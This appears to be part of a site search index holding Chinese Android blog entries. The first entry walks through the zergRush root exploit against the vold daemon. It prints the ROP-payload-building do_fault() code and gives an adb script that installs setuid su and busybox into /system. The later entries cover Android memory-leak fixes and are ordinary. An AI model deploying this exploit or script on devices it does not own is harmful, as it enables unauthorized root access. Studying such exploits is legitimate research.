\u6709\u70b9\u610f\u601d\u4e86\uff0c\u5bf9 vold \u7a0b\u5e8f\u6709\u4e86\u6b6a\u8111\u7b4b\u4e86 \u7528\u8fc7\u5728\u624b\u673a\u4e0a\u7528 ps \u770b\u4e00\u4e0b\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u6709\u662f\u4ece root \u7528\u6237\u6267\u884c\u8fc7\u6765\u7684\u3002 \u7136\u540e\u83b7\u53d6\u4e86\u4e00\u4e0b\u624b\u673a\u7684\u7248\u672c\u53f7\uff0c\u53ea\u5bf9 2.2 2.3 \u4e8c\u4e2a\u7248\u672c\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u4fee\u6b63\u4e86\u4e00\u4e0a heap_addr \u7684\u5730\u5740\u3002 \u7136\u540e\u53c8\u627e\u4e86\u4e00\u4e0b system \u7cfb\u7edf\u8c03\u7528\u51fd\u6570\u7684\u5730\u5740\uff0c\u653e\u5230 system_ptr \u4e2d \u7ee7\u7eed\u770b checkcrash() \u6e05\u9664\u4e86\u4e00\u4e0b logcat \u65e5\u5fd7 \u5220\u9664 /data/local/tmp/crashlog \u6587\u4ef6 \u7b80\u7acb\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u53bb\u751f\u6210\u4e00\u4e0b crashlog \u6587\u4ef6\u3002 \u8c03\u7528 do_fault \u6253\u5f00 crashlog \u6587\u4ef6 \u5728 crashlog \u4e2d\u627e\u5230\u5d29\u6e83\u4fe1\u606f\uff0c\u627e\u5230 sp \u5bc4\u5b58\u5668\u5730\u5740\u3002 \u7b49\u7b49\uff0c\u4e3a\u4ec0\u4e48\u5d29\u6e83\u5462\uff0c\u80af\u5b9a\u662f\u5728 do_fault \u4e2d\u5236\u9020\u7684\uff0c\u6211\u4eec\u8981\u770b\u770b\u8fd9\u5757\u4e86 \u8fd9\u4e2a\u51fd\u6570\u6bd4\u8f83\u4e71\uff0c\u627e\u627e\u91cd\u70b9\u770b if ((sock = socket_local_client(\"vold\", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0) \u4e0d\u9519\u7684\u4fe1\u606f\uff0c\u8fde\u63a5 vold \uff0c\u53c8\u662f\u5b83\uff0c\u4ee5\u524d\u542c\u8bf4\u8fc7\u5b83\u6709\u6f0f\u6d1e\uff0c\u8fd9\u6b21\u8fd8\u662f\u5b83\u3002 write(sock, buf, n+1) \u5199\u4e86\u4e00\u4e9b\u4fe1\u606f\uff0c\u4e0d\u77e5\u9053\u4ec0\u4e48\u4fe1\u606f\uff0c\u4f46\u662f\u53ef\u4ee5\u80af\u5b9a\u7684\u662f\uff0c\u80fd\u8ba9 vold \u5d29\u6e83\u7684\u4fe1\u606f\u3002 \u4e0b\u9762\u56de\u5230 main \u7ee7\u7eed\uff01 \u4e00\u4e2a For \u5faa\u73af\u5904\u7406\u3002 find_stack_addr \u7528\u4e86\u4e0a\u9762\u7684\u76f8\u540c\u65b9\u6cd5\uff0c\u4ece\u5d29\u6e83\u4fe1\u606f\u4e2d\u627e\u5230\u7a0b\u5e8f\u7684\u6808\u5730\u5740\uff0c\uff08\u81f3\u4e8e\u600e\u4e48\u8ba1\u7b97\u7684\uff0c\u4ee5\u540e\u518d\u53bb\u7814\u7a76\u4e86\uff09 \u4e00\u4e9b\u5bb9\u9519\u68c0\u67e5\uff0c\u7565\u8fc7\uff01 kill(logcat_pid, SIGKILL); unlink(crashlog); find_rop_gadgets() \u53c8\u4e00\u4e2a\u964c\u751f\u51fd\u6570\u3002\u770b\u4e86\uff0c\u6682\u65f6\u770b\u4e0d\u51fa\u7528\u9014\uff0c\u8c8c\u4f3c\u627e\u70b9\u4ec0\u4e48\uff0c\u7ee7\u7eed\uff01 \u4e0b\u9762\u5c31\u662f\u518d\u6b21\u8c03\u7528 do_fault ,\u751f\u6210\u5d29\u6e83\u3002 \u518d\u6b21\u5224\u65ad sh \u662f\u5426\u6709\u6ca1\u6709 s \u4f4d\uff0c \u5982\u679c\u6709\u4e86\uff0c\u521a ROOT \u529f\u4e86\u3002 \u7591\u95ee\u6765\u4e86\uff0c\u6ca1\u53d1\u73b0\u600e\u4e48\u518d\u6b21\u8c03\u7528 boomsh \u8fd0\u884c\u6267\u884c do_root \u554a\u3002 \u987a\u7740\u5b83\u62f7\u8d1d\u51fa\u6765\u7684 sh \u6587\u4ef6\u627e\u627e\uff0c\u641c\u7d22 bsh \u53d8\u7406\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u53d1\u73b0\u5982\u4e0b\u5730\u65b9\uff1a 1. static **int** do_fault() 2. { 3. **char** buf[255]; 4. **int** sock = -1, n = 0, i; 5. **char** s_stack_addr[5], s_stack_pivot_addr[5], s_pop_r0_addr[5], s_system[5], s_bsh_addr[5], s_heap_addr[5]; 6. uint32_t bsh_addr; 7. **char** padding[128]; 8. int32_t padding_sz = (jumpsz == 0 ? 0 : gadget_jumpsz - jumpsz); 9. 10. memset(padding, 0, 128); 11. strcpy(padding, \"LORDZZZZzzzz\"); 12. if(padding_sz > 0) { 13. memset(padding+12, 'Z', padding_sz); 14. printf(\"[*] Poping %d more zerglings\\n\", padding_sz); 15. } 16. else if(padding_sz < 0) { 17. memset(padding, 0, 128); 18. memset(padding, 'Z', 12+padding_sz); 19. } 20. 21. if ((sock = socket_local_client(\"vold\", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0) 22. die(\"[-] Error creating Nydus\"); 23. 24. sprintf(s_stack_addr, \"%c%c%c%c\", stack_addr & 0xff, (stack_addr>>8)&0xff, (stack_addr>>16)&0xff, (stack_addr>>24)&0xff); 25. sprintf(s_stack_pivot_addr, \"%c%c%c%c\", stack_pivot & 0xff, (stack_pivot>>8)&0xff, (stack_pivot>>16)&0xff, (stack_pivot>>24)&0xff); 26. sprintf(s_pop_r0_addr, \"%c%c%c%c\", pop_r0 & 0xff, (pop_r0>>8)&0xff, (pop_r0>>16)&0xff, (pop_r0>>24)&0xff); 27. sprintf(s_system, \"%c%c%c%c\", system_ptr & 0xff, (system_ptr>>8)&0xff, (system_ptr>>16)&0xff, (system_ptr>>24)&0xff); 28. sprintf(s_heap_addr, \"%c%c%c%c\", heap_addr & 0xff, (heap_addr>>8)&0xff, (heap_addr>>16)&0xff, (heap_addr>>24)&0xff); 29. 30. strcpy(buf, \"ZERG\"); 31. strcat(buf, \" ZZ \"); 32. strcat(buf, s_stack_pivot_addr); 33. for(i=3; i < buffsz+1; i++) 34. strcat(buf, \" ZZZZ\"); 35. strcat(buf, \" \"); 36. strcat(buf, s_heap_addr); 37. 38. n = strlen(buf); 39. bsh_addr = stack_addr + n + 1 + 8 + 8 + 8 + padding_sz + 12 + 4; 40. 41. if(check_addr(bsh_addr) == -1) { 42. printf(\"[-] Colossus, we're doomed!\\n\"); 43. exit(-1); 44. } 45. 46. sprintf(s_bsh_addr, \"%c%c%c%c\", bsh_addr & 0xff, (bsh_addr>>8)&0xff, (bsh_addr>>16)&0xff, (bsh_addr>>24)&0xff); 47. 48. <strong><span style=\"color:#ffffff;BACKGROUND-COLOR: #ff0000\">n += sprintf(buf+n+1, \"%s%s OVER%s%s%s%sZZZZ%s%c\", s_stack_addr, s_heap_addr, padding, s_pop_r0_addr, s_bsh_addr, s_system, bsh, 0);</span></strong> 49. 50. printf(\"[*] Sending %d zerglings ...\\n\", n); 51. 52. if ((n = write(sock, buf, n+1)) < 0) 53. die(\"[-] Nydus seems broken\"); 54. 55. sleep(3); 56. close(sock); 57. 58. return n; 59. } \u770b\u5230\u4e0a\u9762\u52a0\u8272\u7684\u884c\u4e86\uff0c\u539f\u6765\u4ed6\u662f\u7528 socket \u5199\u7684\u4e00\u4e2a shell code \uff0c\u8c03\u7528\u4e86\u4ed6\u62f7\u8d1d\u7684 sh \u7a0b\u5e8f\u3002 \u5728 vold \u4e2d\u6267\u884c sh \u80af\u5b9a\u662f root \u554a\u3002 \u81f3\u6b64\uff0c\u539f\u7406\u5f88\u662f\u6e05\u695a\u4e86\uff0c shell code \u561b\uff0c\u8fd0\u884c\u7684\u65f6\u5019\u628a\u4ed6 dump \u51fa\u6765\u7528\u522b\u7684\u5de5\u5177\u770b\u5427\uff01 **\u4e00\u952eROOT\u811a\u672c** 1.\u7b49\u5f85\u8bbe\u5907\u8fde\u63a5 adb wait-for-device 2.\u5220\u9664\u6587\u4ef6 adb shell \"cd /data/local/tmp/; rm *\" 3.\u4e0a\u4f20zergRush\u5e76\u4fee\u6539\u5c5e\u6027\u53bb\u6267\u884c adb push c:\\zergRush /data/local/tmp/ adb shell \"chmod 777 /data/local/tmp/zergRush\" adb shell \"/data/local/tmp/zergRush\" adb wait-for-device 4.\u4e0a\u4f20busybox\u3001\u7ed9busybox\u6587\u4ef6\u6267\u884c\u6743\u9650\uff0c\u4ee5\u53ef\u4ee5\u65b9\u5f0f\u52a0\u8f7d\u6587\u4ef6\u7cfb\u7edf adb push c:\\busybox /data/local/tmp/ adb shell \"chmod 755 /data/local/tmp/busybox\" adb shell \"/data/local/tmp/busybox mount -o remount,rw /system\" 5.\u590d\u5236busybox\uff0c\u4fee\u6539\u6240\u5728\u7684\u7ec4\u53ca\u8bbe\u7f6es\u4f4d adb shell \"dd if=/data/local/tmp/busybox of=/system/xbin/busybox\" adb shell \"chown root.shell /system/xbin/busybox\" adb shell \"chmod 04755 /system/xbin/busybox\" 6.\u5b89\u88c5busybox\u5e76\u5220\u9664\u4e34\u65f6\u6587\u4ef6 adb shell \"/system/xbin/busybox --install -s /system/xbin\" adb shell \"rm -rf /data/local/tmp/busybox\" 7.\u5bf9su\u8fdb\u884c\u7c7b\u4f3cbusybox\u7684\u5904\u7406 adb push c:\\fu /system/bin/su adb shell \"chown root.shell /system/bin/su\" adb shell \"chmod 06755 /system/bin/su\" adb shell \"rm /system/xbin/su\" adb shell \"ln -s /system/bin/su /system/xbin/su\" 8.\u5b89\u88c5\u5176\u5b83\u5de5\u5177 adb push c:\\superuser.apk /system/app/ adb shell \"cd /data/local/tmp/; rm *\" adb reboot adb wait-for-device adb install c:\\recovery.apk \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/superkris/article/details/7709504","title":"\u83b7\u53d6\u4e00\u952eroot\u539f\u7406"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/","text":"android\u624b\u673a\u7ed9\u5e94\u7528\u5206\u914d\u7684\u5185\u5b58\u901a\u5e38\u662f8\u5146\u5de6\u53f3\uff0c\u5982\u679c\u5904\u7406\u5185\u5b58\u5904\u7406\u4e0d\u5f53\u5f88\u5bb9\u6613\u9020\u6210OutOfMemoryError\uff0c\u6211\u4eec\u7684\u4ea7\u54c1\u51fa\u73b0\u6700\u591a\u7684\u9519\u8bef\u4e5f\u662fOutOfMemoryError\u7684\u5f02\u5e38\uff0c \u5728\u89e3\u51b3\u8fd9\u4e2a\u5f02\u5e38\u65f6\u5728\u7f51\u4e0a\u53d1\u73b0\u5f88\u591a\u5173\u4e8eOutOfMemoryError\u7684\u539f\u56e0\u7684\u4ecb\u7ecd\u3002 OutOfMemoryError\u4e3b\u8981\u7531\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\u9020\u6210\uff1a 1.\u6570\u636e\u5e93\u7684cursor\u6ca1\u6709\u5173\u95ed\u3002 \u64cd\u4f5cSqlite\u6570\u636e\u5e93\u65f6\uff0cCursor\u662f\u6570\u636e\u5e93\u8868\u4e2d\u6bcf\u4e00\u884c\u7684\u96c6\u5408\uff0cCursor\u63d0\u4f9b\u4e86\u5f88\u591a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8bfb\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c \u53ef\u4ee5\u6839\u636e\u7d22\u5f15\uff0c\u5217\u540d\u7b49\u83b7\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c\u901a\u8fc7\u6e38\u6807\u7684\u65b9\u5f0f\u53ef\u4ee5\u8c03\u7528moveToNext()\u79fb\u5230\u4e0b\u4e00\u884c \u5f53\u6211\u4eec\u64cd\u4f5c\u5b8c\u6570\u636e\u5e93\u540e\uff0c\u4e00\u5b9a\u8981\u8bb0\u5f97\u8c03\u7528Cursor\u5bf9\u8c61\u7684close()\u6765\u5173\u95ed\u6e38\u6807\uff0c\u91ca\u653e\u8d44\u6e90\u3002 2.\u6784\u9020adapter\u6ca1\u6709\u4f7f\u7528\u7f13\u5b58contentview\u3002 \u5728\u7ee7\u627fBaseAdapter\u65f6\u4f1a\u8ba9\u6211\u4eec\u91cd\u5199getView(int position, View convertView, ViewGroup parent)\u65b9\u6cd5\uff0c \u7b2c\u4e8c\u4e2a\u53c2\u6570convertView\u5c31\u662f\u6211\u4eec\u8981\u7528\u5230\u7684\u91cd\u7528\u7684\u5bf9\u8c61 Java\u4ee3\u7801 1. @Override 2. public View getView(int position, View convertView, ViewGroup parent) { 3. ViewHolder vHolder = null; 5. if (convertView == null) { 6. convertView = inflater.inflate(..., null); 8. vHolder = new ViewHolder(); 9. vHolder.img= (ImageView) convertView.findViewById(...); 10. vHolder.tv= (TextView) convertView 11. .findViewById(...); 13. convertView.setTag(vHolder); 14. } else { 16. vHolder = (ViewHolder) convertView.getTag(); 17. } 19. vHolder.img.setImageBitmap(...); 20. vHolder.tv.setText(...); 21. return convertView; 22. } 24. static class ViewHolder { 25. TextView tv; 26. ImageView img; 27. } \u8fd9\u91cc\u53ea\u8bb2\u4f7f\u7528\u65b9\u6cd5\uff0c\u5177\u4f53\u6027\u80fd\u6d4b\u8bd5\u6587\u7ae0\u8bf7\u89c1\uff1a ListView\u4e2dgetView\u7684\u539f\u7406\uff0b\u5982\u4f55\u5728ListView\u4e2d\u653e\u7f6e\u591a\u4e2aitem http://www.cnblogs.com/xiaowenji/archive/2010/12/08/1900579.html Android\u5f00\u53d1\u4e4bListView\u9002\u914d\u5668\uff08Adapter\uff09\u4f18\u5316 http://shinfocom.iteye.com/blog/1231511 3.\u8c03\u7528registerReceiver()\u540e\u672a\u8c03\u7528unregisterReceiver(). \u5e7f\u64ad\u63a5\u6536\u8005\uff08BroadcastReceiver\uff09\u7ecf\u5e38\u5728\u5e94\u7528\u4e2d\u7528\u5230\uff0c\u53ef\u4ee5\u5728\u591a\u7ebf\u7a0b\u4efb\u52a1\u5b8c\u6210\u540e\u53d1\u9001\u5e7f\u64ad\u901a\u77e5UI\u66f4\u65b0\uff0c\u4e5f\u53ef\u4ee5\u63a5\u6536\u7cfb\u7edf\u5e7f\u64ad\u5b9e\u73b0\u4e00\u4e9b\u529f\u80fd \u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u7684\u65b9\u5f0f\u6ce8\u518c\uff1a IntentFilter postFilter = new IntentFilter(); postFilter.addAction(getPackageName() + \".background.job\"); this.registerReceiver(receiver, postFilter); \u5f53\u6211\u4eecActivity\u4e2d\u4f7f\u7528\u4e86registerReceiver()\u65b9\u6cd5\u6ce8\u518c\u4e86BroadcastReceiver\uff0c\u4e00\u5b9a\u8981\u5728Activity\u7684\u751f\u547d\u5468\u671f\u5185\u8c03\u7528unregisterReceiver()\u65b9\u6cd5\u53d6\u6d88\u6ce8\u518c \u4e5f\u5c31\u662f\u8bf4registerReceiver()\u548cunregisterReceiver()\u65b9\u6cd5\u4e00\u5b9a\u8981\u6210\u5bf9\u51fa\u73b0\uff0c\u901a\u5e38\u6211\u4eec\u53ef\u4ee5\u91cd\u5199Activity\u7684onDestory()\u65b9\u6cd5\uff1a Java\u4ee3\u7801 1. @Override 2. protected void onDestroy() { 3. this.unregisterReceiver(receiver); 4. super.onDestroy(); 5. } 4.\u672a\u5173\u95edInputStream/OutputStream\u3002 \u8fd9\u4e2a\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u6211\u4eec\u64cd\u4f5c\u5b8c\u8f93\u5165\u8f93\u51fa\u6d41\u90fd\u8981\u5173\u95ed\u6d41 5.Bitmap\u4f7f\u7528\u540e\u672a\u8c03\u7528recycle()\u3002 \u56fe\u7247\u5904\u7406\u4e0d\u597d\u662f\u9020\u6210\u5185\u5b58\u6ea2\u51fa\u7684\u53c8\u4e00\u4e2a\u5934\u53f7\u539f\u56e0\uff0c\uff08\u5728\u6211\u4eec\u7684\u4ea7\u54c1\u4e2d\u4e5f\u6709\u4f53\u73b0)\uff0c \u5f53\u6211\u4eec\u5904\u7406\u5b8c\u56fe\u7247\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528recycle()\u65b9\u6cd5\u6765\u56de\u6536\u56fe\u7247\u5bf9\u8c61 Java\u4ee3\u7801 1. if(!bitmap.isRecycled()) 2. { 3. bitmap.recycle() 4. } \u9664\u6b64\u4e4b\u5916\uff1a \u76f4\u63a5\u4f7f\u7528ImageView\u663e\u793abitmap\u4f1a\u5360\u7528\u8f83\u591a\u8d44\u6e90\uff0c\u7279\u522b\u662f\u56fe\u7247\u8f83\u5927\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u5bfc\u81f4\u5d29\u6e83\u3002 \u4f7f\u7528BitmapFactory.Options\u8bbe\u7f6einSampleSize, \u8fd9\u6837\u505a\u53ef\u4ee5\u51cf\u5c11\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8981\u6c42\u3002 \u5c5e\u6027\u503cinSampleSize\u8868\u793a\u7f29\u7565\u56fe\u5927\u5c0f\u4e3a\u539f\u59cb\u56fe\u7247\u5927\u5c0f\u7684\u51e0\u5206\u4e4b\u4e00\uff0c\u5373\u5982\u679c\u8fd9\u4e2a\u503c\u4e3a2\uff0c\u5219\u53d6\u51fa\u7684\u7f29\u7565\u56fe\u7684\u5bbd\u548c\u9ad8\u90fd\u662f\u539f\u59cb\u56fe\u7247\u76841/2\uff0c\u56fe\u7247\u5927\u5c0f\u5c31\u4e3a\u539f\u59cb\u5927\u5c0f\u76841/4\u3002 BitmapFactory.Options bitmapFactoryOptions = new BitmapFactory.Options(); bitmapFactoryOptions.inJustDecodeBounds = true; bitmapFactoryOptions.inSampleSize = 2; // \u8fd9\u91cc\u4e00\u5b9a\u8981\u5c06\u5176\u8bbe\u7f6e\u56defalse\uff0c\u56e0\u4e3a\u4e4b\u524d\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u6210\u4e86true // \u8bbe\u7f6einJustDecodeBounds\u4e3atrue\u540e\uff0cdecodeFile\u5e76\u4e0d\u5206\u914d\u7a7a\u95f4\uff0c\u5373\uff0cBitmapFactory\u89e3\u7801\u51fa\u6765\u7684Bitmap\u4e3aNull,\u4f46\u53ef\u8ba1\u7b97\u51fa\u539f\u59cb\u56fe\u7247\u7684\u957f\u5ea6\u548c\u5bbd\u5ea6 options.inJustDecodeBounds = false; Bitmap bmp = BitmapFactory.decodeFile(sourceBitmap, options); 6.Context\u6cc4\u6f0f\u3002 \u8fd9\u662f\u4e00\u4e2a\u5f88\u9690\u6666\u7684OutOfMemoryError\u7684\u60c5\u51b5\u3002\u5148\u770b\u4e00\u4e2aAndroid\u5b98\u7f51\u63d0\u4f9b\u7684\u4f8b\u5b50\uff1a Java\u4ee3\u7801 1. private static Drawable sBackground; 2. @Override 3. protected void onCreate(Bundle state) { 4. super.onCreate(state); 6. TextView label = new TextView(this); 7. label.setText(\"Leaks are bad\"); 9. if (sBackground == null) { 10. sBackground = getDrawable(R.drawable.large\\_bitmap); 11. } 12. label.setBackgroundDrawable(sBackground); 14. setContentView(label); 15. } \u8fd9\u6bb5\u4ee3\u7801\u6548\u7387\u5f88\u5feb\uff0c\u4f46\u540c\u65f6\u53c8\u662f\u6781\u5176\u9519\u8bef\u7684\uff1b \u5728\u7b2c\u4e00\u6b21\u5c4f\u5e55\u65b9\u5411\u5207\u6362\u65f6\u5b83\u6cc4\u9732\u4e86\u4e00\u5f00\u59cb\u521b\u5efa\u7684Activity\u3002\u5f53\u4e00\u4e2aDrawable\u9644\u52a0\u5230\u4e00\u4e2a View\u4e0a\u65f6\uff0c View\u4f1a\u5c06\u5176\u4f5c\u4e3a\u4e00\u4e2acallback\u8bbe\u5b9a\u5230Drawable\u4e0a\u3002\u4e0a\u8ff0\u7684\u4ee3\u7801\u7247\u6bb5\uff0c\u610f\u5473\u7740Drawable\u62e5\u6709\u4e00\u4e2aTextView\u7684\u5f15\u7528\uff0c \u800cTextView\u53c8\u62e5\u6709Activity\uff08Context\u7c7b\u578b\uff09\u7684\u5f15\u7528\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0cDrawable\u62e5\u6709\u4e86\u66f4\u591a\u7684\u5bf9\u8c61\u5f15\u7528\u3002\u5373\u4f7fActivity\u88ab \u9500\u6bc1\uff0c\u5185\u5b58\u4ecd\u7136\u4e0d\u4f1a\u88ab\u91ca\u653e\u3002 \u53e6\u5916\uff0c\u5bf9Context\u7684\u5f15\u7528\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\uff0c\u4e5f\u4f1a\u5bfc\u81f4Context\u6cc4\u6f0f\u3002\u6240\u4ee5\u5c3d\u91cf\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 \u8fd9\u79cdContext\u62e5\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u4e00\u6837\u957f\u7684\u751f\u547d\u5468\u671f\uff0c\u5e76\u4e14\u4e0d\u4f9d\u8d56Activity\u7684\u751f\u547d\u5468\u671f\u3002\u5982\u679c\u4f60\u6253\u7b97\u4fdd\u5b58\u4e00\u4e2a\u957f\u65f6\u95f4\u7684\u5bf9\u8c61\uff0c \u5e76\u4e14\u5176\u9700\u8981\u4e00\u4e2a Context\uff0c\u8bb0\u5f97\u4f7f\u7528Application\u5bf9\u8c61\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528Context.getApplicationContext()\u6216 Activity.getApplication()\u8f7b\u677e\u5f97\u5230Application\u5bf9\u8c61\u3002 \u6700\u8fd1\u9047\u5230\u4e00\u79cd\u60c5\u51b5\u5f15\u8d77\u4e86Context\u6cc4\u6f0f\uff0c\u5c31\u662f\u5728Activity\u9500\u6bc1\u65f6\uff0c\u91cc\u9762\u6709\u5176\u4ed6\u7ebf\u7a0b\u6ca1\u6709\u505c\u3002 \u603b\u7ed3\u4e00\u4e0b\u907f\u514dContext\u6cc4\u6f0f\u5e94\u8be5\u6ce8\u610f\u7684\u95ee\u9898\uff1a 1.\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 2.\u6ce8\u610f\u5bf9Context\u7684\u5f15\u7528\u4e0d\u8981\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\u3002 3.\u614e\u91cd\u7684\u4f7f\u7528\u201cstatic\u201d\u5173\u952e\u5b57\u3002 4.Context\u91cc\u5982\u679c\u6709\u7ebf\u7a0b\uff0c\u4e00\u5b9a\u8981\u5728onDestroy()\u91cc\u53ca\u65f6\u505c\u6389\u3002 7.static\u5173\u952e\u5b57 \u5f53\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u58f0\u660e\u6210static\u540e\uff0c\u5b83\u662f\u5c5e\u4e8e\u7c7b\u7684\u800c\u4e0d\u662f\u5c5e\u4e8e\u5bf9\u8c61\u7684\uff0c\u5982\u679c\u6211\u4eec\u5c06\u5f88\u5927\u7684\u8d44\u6e90\u5bf9\u8c61\uff08Bitmap\uff0ccontext\u7b49\uff09\u58f0\u660e\u6210static\uff0c\u90a3\u4e48\u8fd9\u4e9b\u8d44\u6e90\u4e0d\u4f1a\u968f\u7740\u5bf9\u8c61\u7684\u56de\u6536\u800c\u56de\u6536\uff0c \u4f1a\u4e00\u76f4\u5b58\u5728\uff0c\u6240\u4ee5\u5728\u4f7f\u7528static\u5173\u952e\u5b57\u5b9a\u4e49\u6210\u5458\u53d8\u91cf\u7684\u65f6\u5019\u8981\u614e\u91cd\u3002","title":"Android\u5185\u5b58\u6cc4\u9732\u4f18\u5316\u603b\u7ed3"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#1cursor","text":"\u64cd\u4f5cSqlite\u6570\u636e\u5e93\u65f6\uff0cCursor\u662f\u6570\u636e\u5e93\u8868\u4e2d\u6bcf\u4e00\u884c\u7684\u96c6\u5408\uff0cCursor\u63d0\u4f9b\u4e86\u5f88\u591a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8bfb\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c \u53ef\u4ee5\u6839\u636e\u7d22\u5f15\uff0c\u5217\u540d\u7b49\u83b7\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c\u901a\u8fc7\u6e38\u6807\u7684\u65b9\u5f0f\u53ef\u4ee5\u8c03\u7528moveToNext()\u79fb\u5230\u4e0b\u4e00\u884c \u5f53\u6211\u4eec\u64cd\u4f5c\u5b8c\u6570\u636e\u5e93\u540e\uff0c\u4e00\u5b9a\u8981\u8bb0\u5f97\u8c03\u7528Cursor\u5bf9\u8c61\u7684close()\u6765\u5173\u95ed\u6e38\u6807\uff0c\u91ca\u653e\u8d44\u6e90\u3002","title":"1.\u6570\u636e\u5e93\u7684cursor\u6ca1\u6709\u5173\u95ed\u3002"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#2adaptercontentview","text":"\u5728\u7ee7\u627fBaseAdapter\u65f6\u4f1a\u8ba9\u6211\u4eec\u91cd\u5199getView(int position, View convertView, ViewGroup parent)\u65b9\u6cd5\uff0c \u7b2c\u4e8c\u4e2a\u53c2\u6570convertView\u5c31\u662f\u6211\u4eec\u8981\u7528\u5230\u7684\u91cd\u7528\u7684\u5bf9\u8c61 Java\u4ee3\u7801 1. @Override 2. public View getView(int position, View convertView, ViewGroup parent) { 3. ViewHolder vHolder = null; 5. if (convertView == null) { 6. convertView = inflater.inflate(..., null); 8. vHolder = new ViewHolder(); 9. vHolder.img= (ImageView) convertView.findViewById(...); 10. vHolder.tv= (TextView) convertView 11. .findViewById(...); 13. convertView.setTag(vHolder); 14. } else { 16. vHolder = (ViewHolder) convertView.getTag(); 17. } 19. vHolder.img.setImageBitmap(...); 20. vHolder.tv.setText(...); 21. return convertView; 22. } 24. static class ViewHolder { 25. TextView tv; 26. ImageView img; 27. } \u8fd9\u91cc\u53ea\u8bb2\u4f7f\u7528\u65b9\u6cd5\uff0c\u5177\u4f53\u6027\u80fd\u6d4b\u8bd5\u6587\u7ae0\u8bf7\u89c1\uff1a ListView\u4e2dgetView\u7684\u539f\u7406\uff0b\u5982\u4f55\u5728ListView\u4e2d\u653e\u7f6e\u591a\u4e2aitem http://www.cnblogs.com/xiaowenji/archive/2010/12/08/1900579.html Android\u5f00\u53d1\u4e4bListView\u9002\u914d\u5668\uff08Adapter\uff09\u4f18\u5316 http://shinfocom.iteye.com/blog/1231511","title":"2.\u6784\u9020adapter\u6ca1\u6709\u4f7f\u7528\u7f13\u5b58contentview\u3002"},{"location":"Android/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#3registerreceiverunregisterreceiver","text":"\u5e7f\u64ad\u63a5\u6536\u8005\uff08BroadcastReceiver\uff09\u7ecf\u5e38\u5728\u5e94\u7528\u4e2d\u7528\u5230\uff0c\u53ef\u4ee5\u5728\u591a\u7ebf\u7a0b\u4efb\u52a1\u5b8c\u6210\u540e\u53d1\u9001\u5e7f\u64ad\u901a\u77e5UI\u66f4\u65b0\uff0c\u4e5f\u53ef\u4ee5\u63a5\u6536\u7cfb\u7edf\u5e7f\u64ad\u5b9e\u73b0\u4e00\u4e9b\u529f\u80fd \u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u7684\u65b9\u5f0f\u6ce8\u518c\uff1a IntentFilter postFilter = new IntentFilter(); postFilter.addAction(getPackageName() + \".background.job\"); this.registerReceiver(receiver, postFilter); \u5f53\u6211\u4eecActivity\u4e2d\u4f7f\u7528\u4e86registerReceiver()\u65b9\u6cd5\u6ce8\u518c\u4e86BroadcastReceiver\uff0c\u4e00\u5b9a\u8981\u5728Activity\u7684\u751f\u547d\u5468\u671f\u5185\u8c03\u7528unregisterReceiver()\u65b9\u6cd5\u53d6\u6d88\u6ce8\u518c \u4e5f\u5c31\u662f\u8bf4registerReceiver()\u548cunregisterReceiver()\u65b9\u6cd5\u4e00\u5b9a\u8981\u6210\u5bf9\u51fa\u73b0\uff0c\u901a\u5e38\u6211\u4eec\u53ef\u4ee5\u91cd\u5199Activity\u7684onDestory()\u65b9\u6cd5\uff1a Java\u4ee3\u7801 1. @Override 2. protected void onDestroy() { 3. this.unregisterReceiver(receiver); 4. super.onDestroy(); 5. 